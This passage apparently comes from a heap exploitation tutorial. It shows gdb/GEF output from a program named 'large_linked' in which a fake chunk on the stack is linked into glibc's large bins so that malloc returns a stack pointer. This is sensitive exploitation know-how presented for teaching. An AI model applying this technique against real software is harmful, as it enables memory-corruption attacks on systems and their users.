$r14   : 0x0000555555557da0  →  0x0000555555555140  →  <__do_global_dtors_aux+0> endbr64 
$r15   : 0x00007ffff7ffd020  →  0x00007ffff7ffe2e0  →  0x0000555555554000  →   jg 0x555555554047
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdb30│+0x0000: 0x0000000000000002   ← $rsp
0x00007fffffffdb38│+0x0008: 0x00005555555592a0  →  0x0000555555559750  →  0x0000000000000000
0x00007fffffffdb40│+0x0010: 0x0000555555559760  →  0x00007ffff7e2d0f0  →  0x00007ffff7e2d0e0  →  0x00007ffff7e2d0d0  →  0x00007ffff7e2d0c0  →  0x00007ffff7e2d0b0  →  0x00007ffff7e2d0a0
0x00007fffffffdb48│+0x0018: 0x0000555555559c20  →  0x00007fffffffdb50  →  0x0000000000000000
0x00007fffffffdb50│+0x0020: 0x0000000000000000
0x00007fffffffdb58│+0x0028: 0x0000000000000431
0x00007fffffffdb60│+0x0030: 0x0000555555559750  →  0x0000000000000000    ← $rax, $rdi
0x00007fffffffdb68│+0x0038: 0x0000555555559290  →  0x0000000000000000
──────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x5555555552ba <main+305>       call   0x555555555090 <malloc@plt>
   0x5555555552bf <main+310>       mov    edi, 0x420
   0x5555555552c4 <main+315>       call   0x555555555090 <malloc@plt>
 → 0x5555555552c9 <main+320>       nop    
   0x5555555552ca <main+321>       mov    rax, QWORD PTR [rbp-0x8]
   0x5555555552ce <main+325>       sub    rax, QWORD PTR fs:0x28
   0x5555555552d7 <main+334>       je     0x5555555552de <main+341>
   0x5555555552d9 <main+336>       call   0x555555555080 <__stack_chk_fail@plt>
   0x5555555552de <main+341>       leave  
──────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "large_linked", stopped 0x5555555552c9 in main (), reason: BREAKPOINT
────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x5555555552c9 → main()
─────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  p $rax
$2 = 0x7fffffffdb60
gef➤  vmmap 0x7fffffffdb60
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
gef➤  heap bins
────────────────────────────────────── Tcachebins for thread 1 ──────────────────────────────────────
All tcachebins are empty
─────────────────────────────── Fastbins for arena at 0x7ffff7e2cca0 ───────────────────────────────
Fastbins[idx=0, size=0x20] 0x00
Fastbins[idx=1, size=0x30] 0x00
Fastbins[idx=2, size=0x40] 0x00
Fastbins[idx=3, size=0x50] 0x00
Fastbins[idx=4, size=0x60] 0x00
Fastbins[idx=5, size=0x70] 0x00
Fastbins[idx=6, size=0x80] 0x00
───────────────────────────── Unsorted Bin for arena at 0x7ffff7e2cca0 ─────────────────────────────
[+] Found 0 chunks in unsorted bin.
────────────────────────────── Small Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] Found 0 chunks in 0 small non-empty bins.
────────────────────────────── Large Bins for arena at 0x7ffff7e2cca0 ──────────────────────────────
[+] large_bins[63]: fw=0x555555559290, bk=0x555555559750
 →   Chunk(addr=0x5555555592a0, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)   →   Chunk(addr=0x555555559760, size=0x430, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA)
[+] Found 2 chunks in 1 large non-empty bins.
gef➤  x/20g 0x555555559290
0x555555559290: 0x0 0x431
0x5555555592a0: 0x555555559750  0x7ffff7e2d0f0
0x5555555592b0: 0x555555559290  0x555555559290
0x5555555592c0: 0x0 0x0
0x5555555592d0: 0x0 0x0
0x5555555592e0: 0x0 0x0
0x5555555592f0: 0x0 0x0
0x555555559300: 0x0 0x0
0x555555559310: 0x0 0x0
0x555555559320: 0x0 0x0
gef➤  x/20g 0x555555559750
0x555555559750: 0x0 0x431
0x555555559760: 0x7ffff7e2d0f0  0x555555559290
0x555555559770: 0x0 0x0
0x555555559780: 0x0 0x0
0x555555559790: 0x0 0x0
0x5555555597a0: 0x0 0x0
0x5555555597b0: 0x0 0x0
0x5555555597c0: 0x0 0x0
0x5555555597d0: 0x0 0x0
0x5555555597e0: 0x0 0x0
gef➤  x/20g 0x7fffffffdb50
0x7fffffffdb50: 0x0 0x431
0x7fffffffdb60: 0x555555559750  0x555555559290
0x7fffffffdb70: 0x0 0x0
0x7fffffffdb80: 0x2 0x7ffff7fc1a28
0x7fffffffdb90: 0x1 0x0
0x7fffffffdba0: 0x1 0x7ffff7fc1000
0x7fffffffdbb0: 0x7ffff7fc1a28  0x7ffff7fc1000
0x7fffffffdbc0: 0x1 0x7ffff7fc1388
0x7fffffffdbd0: 0x0 0x0
0x7fffffffdbe0: 0x0 0x7ffff7fc9c00
gef➤  c
Continuing.
[Inferior 1 (process 93109) exited normally]
```

Just like that, we see that we were able to allocate a ptr onto the stack.
